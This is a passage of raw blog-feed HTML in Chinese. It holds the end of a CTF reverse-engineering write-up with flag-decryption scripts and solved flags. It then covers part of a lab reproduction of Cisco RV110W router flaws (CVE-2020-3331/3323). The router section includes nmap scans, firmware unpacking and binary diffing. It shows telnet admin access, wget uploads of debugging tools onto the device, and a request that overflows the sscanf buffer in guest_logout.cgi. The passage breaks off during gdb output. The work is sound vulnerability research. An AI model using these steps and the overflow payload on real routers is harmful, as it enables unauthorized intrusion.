class="number">0x1e</span>, <span class="number">0x1e</span>, <span class="number">0xf0</span>, <span class="number">0xec</span>,</span><br><span class="line">        <span class="number">0xef</span>, <span class="number">0x1e</span>, <span class="number">0xe9</span>, <span class="number">0x1e</span>, </span><br><span class="line"><span class="number">0xec</span>, <span class="number">0xec</span>, <span class="number">0xe8</span>, <span class="number">0xec</span>,</span><br><span class="line">        <span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0xee</span>, <span class="number">0x1b</span>, </span><br><span class="line"><span class="number">0xef</span>, <span class="number">0xef</span>, <span class="number">0xec</span>, <span class="number">0xea</span>,</span><br><span class="line">        <span class="number">0x1c</span>, <span class="number">0xea</span>, <span class="number">0xe8</span>, <span class="number">0xeb</span>, </span><br><span class="line"><span class="number">0xee</span>, <span class="number">0xeb</span>, <span class="number">0x1d</span>, <span class="number">0xf1</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span>(key[i]&gt;=<span class="number">0x19</span> <span class="keyword">and</span> key[i]&lt;<span class="number">0xe8</span>):</span><br><span class="line">flag+=<span class="built_in">chr</span>(key[i]-<span class="number">0x19</span>+<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">flag+=<span class="built_in">chr</span>(key[i]-<span class="number">0xe8</span>+<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">flag+=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"><span class="comment">#flag&#123;39a0ff847f1f4404aa6c7742d20363e9&#125;</span></span><br></pre></td></tr></table></figure><h2 id="APK2"><a href="#APK2" class="headerlink" title="APK2"></a>APK2</h2><p>用jeb打开，查看MainActivity</p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201220191014645.png" alt="image-20201220191014645" style="zoom: 67%;"><p>看到是通过check函数进行判断，用IDA打开so，没找到check函数，应该是动态注册的，查看JNI_ONLOAD，伪码大致如下</p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201220192638330-1608464432901.png" alt="123" style="zoom:67%;"><p>点进off_18708查看如下</p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201220194154160.png" alt="image-20201220194154160" style="zoom:80%;"><p>发现check函数名和地址，点进去查看check函数</p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201220194753447.png" alt="image-20201220194753447" style="zoom:80%;"><p>sub_74F0为判断输入长度的函数，这里IDA伪码没显示其输入的情况，实际上就是判断输入长度为22，而sub_77E8为抽取字符串，这里表示提取input的0-3位的字符到v13,之后判断4位是否是“{”，又提取了中间16位到v17。接下来查看sub_7826函数</p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201220200058212.png" alt="image-20201220200058212" style="zoom:67%;"><p>结合check中调用该函数传递的参数，可以看出内部有一个8次的循环，每个循环将v17每两个相邻字符转换成一个16进制数保存到v5中</p><p>回到check函数继续分析，v5复制到dest中，sub_74F0似乎没什么用,进入sub_799C查看</p><p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201221211252484.png" alt="image-20201221211252484"></p><p>发现这里函数居然有三个参数，这就修改一下check函数内的函数调用结构，发现第三个参数就是dest，继续看sub_799C,其中调用的sub_78C4和sub_7950有明显的RC4加密特征，以保存到v13的“flag”作为初始密钥，加密后的值仍保存在dest中</p><p>回到check函数查看函数sub_7894，同样需要修改一下函数调用结构，内部如下，就是将”flag”以16进制字符串的形式写入了s中，即为”666C6167”</p><p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201221212609580.png" alt="image-20201221212609580"></p><p>回到check函数查看，sub_7894中生成的s会在sub_8294中使用，进入查看</p><p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201221212337177.png" alt="image-20201221212337177"></p><p>其中两个函数分别是DES加密算法的初始化和加密函数，密钥就是之前生成的s，最终加密结果为为一个八位字符串，写入v14中</p><p>回到check函数，最后还有一个循环移位的过程</p><p><img src="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/image-20201221213702848.png" alt="image-20201221213702848"></p><p>就是将原前四位循环移动到最后，即01234567转换为45670123，即完成最后的加密结果</p><p>最后要比较的16进制整数为0x41316EEA99EDA1D9，则在DES加密后对应的结果为<code>0x99 0xed 0x a1 0xd9 0x41 0x31 0x6e 0xea</code>，然后就可以先后进行DES和RC4解密了</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES, ARC4</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex</span><br><span class="line"></span><br><span class="line">c=<span class="string">b&#x27;\x99\xed\xa1\xd9\x41\x31\x6e\xea&#x27;</span></span><br><span class="line">key_des=<span class="string">b&#x27;666C6167&#x27;</span></span><br><span class="line">key_rc4=<span class="string">b&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line">rc4 = ARC4.new(key_rc4)</span><br><span class="line">des = DES.new(key_des, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">p1=des.decrypt(c)</span><br><span class="line">p2=rc4.decrypt(p1)</span><br><span class="line">inp=b2a_hex(p2).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;flag&#123;&#x27;</span>+inp+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;76952041e276e2bf&#125;</span></span><br></pre></td></tr></table></figure><p>这里说一下我在写这个脚本时碰到的坑，主要是Crpto.Cipher模块，其中ARC4的密钥理论上是1-256，但脚本中长度为4的密钥却会报错，在网上找不到解决办法，最后打开库内ARC4.py的源码，发现限制密钥长度要大于4，修改范围后即可正常运行。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现--思科路由器RV110W</title>
      <link href="2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/"/>
      <url>2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/</url>
      
        <content type="html"><![CDATA[<p><strong>照着学长的指导复现的第一个IOT设备</strong></p><a id="more"></a><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>使用<code>nmap</code>扫描其常用端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ nmap 192.168.1.1</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2020-11-30 05:10 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0065s latency).</span><br><span class="line">Not shown: 994 filtered ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">23/tcp  open  telnet</span><br><span class="line">25/tcp  open  smtp</span><br><span class="line">80/tcp  open  http</span><br><span class="line">110/tcp open  pop3</span><br><span class="line">443/tcp open  https</span><br><span class="line">444/tcp open  snpp</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.88 seconds</span><br></pre></td></tr></table></figure><p>发现在23端口为telnet，80端口为http，然后用<code>curl -v</code>输出与80端口通信的过程，发现其被重定位到了https即443端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ curl -v http://192.168.1.1</span><br><span class="line">* Rebuilt URL to: http://192.168.1.1/</span><br><span class="line">*   Trying 192.168.1.1...</span><br><span class="line">* Connected to 192.168.1.1 (192.168.1.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.1.1</span><br><span class="line">&gt; User-Agent: curl/7.47.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 302 Redirect</span><br><span class="line">&lt; Server: httpd</span><br><span class="line">&lt; Date: Fri, 01 Jan 2010 15:17:12 GMT</span><br><span class="line">&lt; Location: https://192.168.1.1</span><br><span class="line">&lt; Content-Type: text/plain</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; </span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure><h3 id="固件提取与解包"><a href="#固件提取与解包" class="headerlink" title="固件提取与解包"></a>固件提取与解包</h3><p>赛题已经给出了特定版本的固件，无需特别进行提取操作，但还需要进行固件解包以得到设备的程序文件，在解包前，需要配置必须的环境</p><p>首先安装binwalk，binwalk可对设备固件进行文件格式的分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install binwalk</span><br></pre></td></tr></table></figure><p>对于目标固件，还需要安装<code>sasquatch</code>这一组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch</span><br><span class="line"><span class="built_in">cd</span> sasquatch </span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure><p>此时使用binwalk还是会错误，还需要进行一些操作</p><ul><li>进入squashfs-tools文件夹,位于下载的sasquatch文件夹内，很容易找到</li><li>编辑Makefile文件，注释掉XZ_SUPPORT = 1行</li><li>执行<code>sudo make &amp;&amp; sudo make instal</code></li></ul><p>此后再执行以下命令即可解压出完整文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me RV110W_FW_1.2.2.5.bin</span><br></pre></td></tr></table></figure><p>如下图所示</p><img src="/2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/image-20201130223158149.png" alt="image-20201130223158149" style="zoom:50%;"><img src="/2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/image-20201130223337112.png" alt="image-20201130223337112" style="zoom:50%;"><p>查看文件，确认目标平台为：MIPS 32位 小端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file sbin/rc</span><br><span class="line">sbin/rc: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>可以尝试在网上搜索关于该设备的漏洞，最基本的方法是在CVE官网上搜索设备相关信息，找到部分前台漏洞如下：</p><table><thead><tr><th>CVE编号</th><th>漏洞详情</th></tr></thead><tbody><tr><td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3331">CVE-2020-3331</a></td><td>由于基于Web的管理界面未正确验证用户提供的输入数据而引起的前台RCE</td></tr><tr><td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3330">CVE-2020-3330</a></td><td>Telnet服务漏洞，可获取系统账户具有的默认静态密码</td></tr><tr><td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3323">CVE-2020-3323</a></td><td>同为前台RCE</td></tr><tr><td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3150">CVE-2020-3150</a></td><td>要求有经过认证的用户登录过的文件下载</td></tr><tr><td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3144">CVE-2020-3144</a></td><td>绕过前台认证，到后台执行命令</td></tr></tbody></table><h4 id="CVE-2020-3330"><a href="#CVE-2020-3330" class="headerlink" title="CVE-2020-3330"></a>CVE-2020-3330</h4><p>该漏洞为telnet服务的漏洞，可以在固件内找到管理员用户以及对应的密码hash值，<a href="https://blogs.360.cn/post/yi-ge-zi-jie-cha-cuo-dao-zhi-Cisco-fang-huo-qiang-lu-you-qi-yuan-cheng-dai-ma-zhi-xing.html">一篇分析该漏洞的文章</a></p><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>确定目标为CVE-2020-3331和CVE-2020-3323，因为都是Web前台RCE，且目标只开放了443端口(80端口被重定向)，所以要先找到Web对应的二进制程序</p><h4 id="固件搜索"><a href="#固件搜索" class="headerlink" title="固件搜索"></a>固件搜索</h4><p>全局搜索登陆界面名称<code>login.cgi</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ grep -Rn <span class="string">&quot;login.cgi&quot;</span> * 2&gt;/dev/null</span><br><span class="line">匹配到二进制文件 iot/rv110w/_RV110W_FW_1.2.2.5.bin.extracted/squashfs-root/usr/sbin/httpd</span><br><span class="line">iot/rv110w/_RV110W_FW_1.2.2.5.bin.extracted/squashfs-root/www/login.asp:453:&lt;FORM id=frm name=login method=&lt;% get_http_method(); %&gt; action=<span class="string">&quot;login.cgi&quot;</span> onKeyDown=chk_keypress(event) autocomplete=off&gt;</span><br></pre></td></tr></table></figure><p>可以看到二进制文件<code>usr/sbin/httpd</code>应该是Web程序</p><h4 id="端口分析"><a href="#端口分析" class="headerlink" title="端口分析"></a>端口分析</h4><p>设备自带的netstat无法查看端口对应的进程号，所以下载busybox，上传到路由器内（注意在实机调试中实际上不能直接使用这一方法，因为上传文件首先需要admin用户，这里是通过另一个漏洞获取的，所以可以直接用telnet上传文件，通常需要实机拆解调试，这里为方便处理使用了这种方法）</p><p>在本机开启web服务，在虚拟机开启的话操作会更麻烦，这里是在windows环境下开启的，注意将下载好的busybox放到某文件夹内后需在同一目录开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\ctf\Iot\rw110w&gt;python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure><p>用telnet管理员用户登陆路由器，在<code>/tmp</code>目录内用wget下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ telnet 192.168.1.1</span><br><span class="line">Trying 192.168.1.1...</span><br><span class="line">Connected to 192.168.1.1.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">RV110W login: admin</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.7.2 (2019-04-22 16:08:01 CST) built-in shell (ash)</span><br><span class="line">Enter <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> a list of built-in commands.</span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ wget http://192.168.1.100:8000/busybox-mipsel</span><br><span class="line">Connecting to 192.168.1.100:8000 (192.168.1.100:8000)</span><br><span class="line">busybox-mipsel       100% |*******************************|  1539k 00:00:00 ETA</span><br></pre></td></tr></table></figure><p>注意下载好后的文件可能没有执行权限，用<code>chmod</code>授予，用该</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chmod +x busybox-mipsel</span></span><br><span class="line"><span class="comment"># ./busybox-mipsel netstat -pantu | grep 443</span></span><br><span class="line">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      356/httpd</span><br><span class="line">tcp        0      0 :::443                  :::*                    LISTEN      356/httpd</span><br></pre></td></tr></table></figure><p>可以看到进程号对应httpd。</p><p>此后的调试还需要上传gdbserver，方法相同</p><h4 id="目标分析"><a href="#目标分析" class="headerlink" title="目标分析"></a>目标分析</h4><p>查看文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/rv110w/_RV110W_FW_1.2.2.5.bin.extracted/squashfs-root/usr/sbin$ file httpd</span><br><span class="line">httpd: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line">ssr@ubuntu:~/iot/rv110w/_RV110W_FW_1.2.2.5.bin.extracted/squashfs-root/usr/sbin$ checksec httpd</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>可以看到基本没开保护</p><p>但是直接反汇编分析还是比较复杂，因为新版本固件修复了以上漏洞，不妨对比查看</p><h5 id="固件对比"><a href="#固件对比" class="headerlink" title="固件对比"></a>固件对比</h5><p>下载新版1.2.2.8固件，同样用binwalk解包，对比httpd程序，这里就要使用IDA的bindiff插件，注意官网下载需要科学上网，安装时要指定IDA目录，我安装时初次是用4.30版本，不适用于7.x版本的ida，用5版本的bindiff即可。</p><p>在IDA的File菜单中可使用这一工具，在保存了两个文件的idb情况下，打开一个文件后用该工具选中另一个文件的idb，即可对比查看，可以在Matched Functions界面看到如下图所示</p><p><img src="/2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/image-20201202090906028.png" alt="image-20201202090906028"></p><p>颜色越红的函数越不匹配。考虑到目标是获取前台的get_shell，所以guest_logout_cgi比较可疑，右键该函数选择<code>View flow graphs</code>功能即可进入bindiff对比查看</p><p>可以看到一个危险函数<code>sscanf</code></p><p><img src="/2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/image-20201202091919843.png" alt="image-20201202091919843"></p><p>测试访问guest_logout.cgi，发现是可以访问的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ curl -k -v https://192.168.1.1/guest_logout.cgi</span><br><span class="line">*   Trying 192.168.1.1...</span><br><span class="line">* Connected to 192.168.1.1 (192.168.1.1) port 443 (<span class="comment">#0)</span></span><br><span class="line">* found 138 certificates <span class="keyword">in</span> /etc/ssl/certs/ca-certificates.crt</span><br><span class="line">* found 557 certificates <span class="keyword">in</span> /etc/ssl/certs</span><br><span class="line">* ALPN, offering http/1.1</span><br><span class="line">* SSL connection using TLS1.2 / RSA_AES_128_GCM_SHA256</span><br><span class="line">*  server certificate verification SKIPPED</span><br><span class="line">*  server certificate status verification SKIPPED</span><br><span class="line">*  common name: BC:67:1C:41:F8:06 (does not match <span class="string">&#x27;192.168.1.1&#x27;</span>)</span><br><span class="line">*  server certificate expiration date OK</span><br><span class="line">*  server certificate activation date OK</span><br><span class="line">*  certificate public key: RSA</span><br><span class="line">*  certificate version: <span class="comment">#3</span></span><br><span class="line">*  subject: O=Cisco Systems\, Inc.,OU=Cisco,CN=BC:67:1C:41:F8:06,serialNumber=PID:RV110W-E SN:CCQ20311409</span><br><span class="line">*  start date: Thu, 09 Oct 2014 09:15:25 GMT</span><br><span class="line">*  expire date: Sun, 06 Oct 2024 09:15:25 GMT</span><br><span class="line">*  issuer: O=Cisco Systems\, Inc.,OU=Cisco,CN=BC:67:1C:41:F8:06,serialNumber=PID:RV110W-E SN:CCQ20311409</span><br><span class="line">*  compression: NULL</span><br><span class="line">* ALPN, server did not agree to a protocol</span><br><span class="line">&gt; GET /guest_logout.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.1.1</span><br><span class="line">&gt; User-Agent: curl/7.47.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 Ok</span><br><span class="line">&lt; Server: httpd</span><br><span class="line">&lt; Date: Fri, 01 Jan 2010 03:20:09 GMT</span><br><span class="line">&lt; Cache-Control: no-cache</span><br><span class="line">&lt; Pragma: no-cache</span><br><span class="line">&lt; Expires: 0</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; </span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure><p>用IDA查看1.2.2.5版本固件的guest_logout_cgi伪码，找到sscanf函数部分如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v5 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_cgi((<span class="keyword">char</span> *)&amp;unk_480000 + <span class="number">0x19B0</span>);</span><br><span class="line">v10 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">v11 = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_cgi(<span class="string">&quot;submit_button&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v11 )</span><br><span class="line">  v11 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( v5 &amp;&amp; v10 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( VERIFY_MAC_17(v5) &amp;&amp; VERIFY_IPv4(v10) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v11, <span class="string">&quot;status_guestnet.asp&quot;</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    <span class="built_in">sscanf</span>(v11, <span class="string">&quot;%[^;];%*[^=]=%[^\n]&quot;</span>, v29, v28);</span><br></pre></td></tr></table></figure><p>sscanf为栈溢出，<code>%[^;];%*[^=]=%[^\n]</code>中，%表示选择，%*表示过滤，三个中括号表示类似正则的字符集，意思分别为：</p><ul><li><code>%[^;]</code>：分号前所有的字符</li><li><code>;%*[^=]</code>：分号后，等号前的字符都不要</li><li><code>=%[^\n]</code>：等号后，换行符前的所有字符</li></ul><p>v5未被正确识别，找到<code>0x004819B0</code>处，为<code>.rodata:004819B0 aCmac:  .ascii &quot;cmac&quot;&lt;0&gt;</code></p><p>分析到达sscanf所需的条件：</p><ul><li>cmac：mac地址格式</li><li>cip：ip地址格式</li><li>submit_button：包含status_guestnet.asp</li></ul><h4 id="用requests发包测试该程序"><a href="#用requests发包测试该程序" class="headerlink" title="用requests发包测试该程序"></a>用requests发包测试该程序</h4><h4 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h4><p>下载对应版本的gdbserver，用之前的方法上传到路由器，挂载到httpd对应的356进程上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.1.100:8000/gdbserver</span><br><span class="line">./gdbserver :1234 --attach 356</span><br><span class="line">Attached; pid = 356</span><br><span class="line">Listening on port 1234</span><br></pre></td></tr></table></figure><p>然后启用<code>gdb-multiarch</code>开始远程调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/rv110w/_RV110W_FW_1.2.2.5.bin.extracted/squashfs-root/usr/sbin$ gdb-multiarch -q httpd</span><br><span class="line">pwndbg: loaded 190 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from httpd...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> architecture mips</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">gdb-peda$ target remote 192.168.1.1:1234</span><br></pre></td></tr></table></figure><p>然后发送之前测试用的报文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"><span class="comment">#requests.get(url, data=payload, verify=False, timeout=1)</span></span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>此时可在<code>gdb-multiarch</code>终端看到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 